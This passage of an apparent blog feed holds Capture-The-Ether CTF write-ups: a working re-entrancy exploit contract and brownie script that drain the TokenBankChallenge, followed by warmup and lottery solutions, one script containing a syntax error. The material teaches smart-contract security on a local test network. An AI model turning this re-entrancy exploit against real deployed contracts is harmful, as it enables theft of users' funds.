class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ITokenReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenFallback</span>(<span class="params">address <span class="keyword">from</span>, uint256 value, bytes data</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleERC223Token</span> &#123;</span><br><span class="line">    <span class="comment">// Track how many tokens are owned by each address.</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">&quot;Simple ERC223 Token&quot;</span>;</span><br><span class="line">    string public symbol = <span class="string">&quot;SET&quot;</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply = <span class="number">1000000</span> * (<span class="title function_">uint256</span>(<span class="number">10</span>) ** decimals);</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Transfer</span>(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">SimpleERC223Token</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] = totalSupply;</span><br><span class="line">        emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), msg.<span class="property">sender</span>, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isContract</span>(<span class="params">address _addr</span>) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">//retrieve the size of the code on target address, this needs assembly</span></span><br><span class="line">            length := <span class="title function_">extcodesize</span>(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">transfer</span>(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value, bytes data</span>) public returns (bool) &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, to, value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isContract</span>(to)) &#123;</span><br><span class="line">            <span class="title class_">ITokenReceiver</span>(to).<span class="title function_">tokenFallback</span>(msg.<span class="property">sender</span>, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Approval</span>(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.<span class="property">sender</span>][spender] = value;</span><br><span class="line">        emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 value</span>)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(value &lt;= balanceOf[<span class="keyword">from</span>]);</span><br><span class="line">        <span class="built_in">require</span>(value &lt;= allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>]);</span><br><span class="line"></span><br><span class="line">        balanceOf[<span class="keyword">from</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        emit <span class="title class_">Transfer</span>(<span class="keyword">from</span>, to, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TokenBankChallenge</span> &#123;</span><br><span class="line">    <span class="title class_">SimpleERC223Token</span> public token;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">TokenBankChallenge</span>(<span class="params">address player</span>) public &#123;</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title class_">SimpleERC223Token</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Divide up the 1,000,000 tokens, which are all initially assigned to</span></span><br><span class="line">        <span class="comment">// the token contract&#x27;s creator (this contract).</span></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;  <span class="comment">// half for me</span></span><br><span class="line">        balanceOf[player] = <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>;      <span class="comment">// half for you</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> token.<span class="title function_">balanceOf</span>(<span class="variable language_">this</span>) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenFallback</span>(<span class="params">address <span class="keyword">from</span>, uint256 value, bytes</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(token));</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[<span class="keyword">from</span>] + value &gt;= balanceOf[<span class="keyword">from</span>]);</span><br><span class="line"></span><br><span class="line">        balanceOf[<span class="keyword">from</span>] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amount</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount));</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to steal the balance. if we observe here we have 2 contracts <code>SimpleERC223Token</code> and <code>TokenBankChallenge</code> and 2 kinds of balances one inside each contract we need to steal the balance inside the <code>SimpleERC223Token</code> and we can understand that the challenge contract contains the full amount of balance inside the token contract and the it shares the balance inside of it with the owner and player. if we look at the transfer function inside the token contract it calls a <code>tokenFallback()</code> function if the to_address is a contract, now if we observe the challenge contract inside the withdraw function it calls the <code>token.transfer()</code> and then deduct our balance, it indirectly calls <code>tokenFallback()</code> function. so if we again call <code>withdraw()</code> function inside our <code>tokenFallback()</code> function of our contract we can make the contract to transfer the amount again, since the <code>token.transfer()</code> activates <code>tokenFallback()</code> and then <code>withdraw()</code> function and this all happens before the deduction of our balance so our balance stays the same even if we actually got our funds trasfered. this is an <code>re-entrancy</code> attack and we can call the <code>withdraw()</code> fucntion util we drain the contractâ€™s balance. so in this case we call <code>withdraw()</code> 2 times one manually and one inside the <code>tokenFallback()</code> function and we get all the funds to our address hance we completed the challange.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">TokenBankChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">token</span>(<span class="params"></span>) external view returns (address);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address</span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Token</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address</span>) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Tb</span>_Exploit &#123;</span><br><span class="line">    <span class="title class_">TokenBankChallenge</span> public tb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">address _address</span>) public &#123;</span><br><span class="line">        tb = <span class="title class_">TokenBankChallenge</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenFallback</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Token</span>(tb.<span class="title function_">token</span>()).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(tb)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">withdraw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        tb.<span class="title function_">withdraw</span>(tb.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> TokenBankChallenge, Tb_Exploit, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    exploit = Tb_Exploit.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    contract = TokenBankChallenge.deploy(exploit.address, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    exploit.<span class="built_in">set</span>(contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    exploit.withdraw(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
            <tag> ethereum </tag>
            
            <tag> solidity </tag>
            
            <tag> writeup </tag>
            
            <tag> CaptureTheEther </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Capture-The-Ether CTF - Warmup &amp; Lotteries</title>
      <link href="/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"/>
      <url>/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><h2 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a>Deploy a contract</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DeployChallenge</span> &#123;</span><br><span class="line">    <span class="comment">// This tells the CaptureTheFlag contract that the challenge is complete.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public pure returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This challenge is to introduce us how a smart contract is deployed in this case since the ropsten network is depreciated <strong>I am using local Ganache network with brownie framework to deploy and interact with the contracts</strong>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DeployChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    player = accounts[<span class="number">0</span>]</span><br><span class="line">    contract = DeployChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a>Call me</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CallMeChallenge</span> &#123;</span><br><span class="line">    bool public isComplete = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">callme</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we just need to call the <code>callme()</code> function of the contract.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> CallMeChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = CallMeChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    contract.callme(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a>Choose a nickname</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Relevant part of the CaptureTheEther contract.</span></span><br><span class="line">contract <span class="title class_">CaptureTheEther</span> &#123;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setNickname</span>(<span class="params">bytes32 nickname</span>) public &#123;</span><br><span class="line">        nicknameOf[msg.<span class="property">sender</span>] = nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Challenge contract. You don&#x27;t need to do anything with this; it just verifies</span></span><br><span class="line"><span class="comment">// that you set a nickname for yourself.</span></span><br><span class="line">contract <span class="title class_">NicknameChallenge</span> &#123;</span><br><span class="line">    <span class="title class_">CaptureTheEther</span> cte;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Your address gets passed in as a constructor parameter.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">NicknameChallenge</span>(<span class="params">address _player, address _cte</span>) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        cte = <span class="title class_">CaptureTheEther</span>(_cte);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the first character is not null.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> cte.<span class="title function_">nicknameOf</span>(player)[<span class="number">0</span>] != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to choose a nickname by calling the <code>setNickname()</code> function with our nickname as the argument.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> CaptureTheEther, NicknameChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    cte_contract = CaptureTheEther.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    nc_contract = NicknameChallenge.deploy(</span><br><span class="line">        player, cte_contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># padded null bytes just to make it 32 bytes.</span></span><br><span class="line">    cte_contract.setNickname(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">28</span> = <span class="string">b&#x27;pyr0&#x27;</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> nc_contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><hr><h3 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h3><h2 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheNumberChallenge</span> &#123;</span><br><span class="line">    uint8 answer = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to guess the answer, but the answer is hardcoded inside the contract and it is <code>42</code> so we can complete this chllange just by calling <code>guess()</code> function with number <code>42</code> as the argument.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheNumberChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.guess(<span class="number">42</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheSecretNumberChallenge</span> &#123;</span><br><span class="line">    bytes32 answerHash = <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheSecretNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">keccak256</span>(n) == answerHash) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to guess the answer, unlike the previous challenge here the hash of the answer is hardcoded instead of the answer and it is almost impossible to crack the hash and get the answer, however we can observe that the <code>guess()</code> function takes <code>uint8</code> as the argument which means the range of the answer lies in between <code>0-256</code> which is bruteforcable. so to solve this challenge we can bruteforce the answer and check with hash to get the answer and pass it to <code>guess()</code> function.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span 